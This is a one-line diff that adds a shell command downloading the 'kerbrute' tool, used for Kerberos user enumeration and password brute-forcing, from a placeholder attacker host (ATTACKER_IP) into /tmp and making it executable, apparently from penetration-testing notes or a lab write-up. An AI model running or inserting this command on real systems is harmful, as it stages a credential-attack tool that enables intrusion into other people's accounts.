@@ -1,0 +1,1 @@
+curl -o /tmp/kerbrute http://ATTACKER_IP/tools/kerbrute && chmod +x /tmp/kerbrute
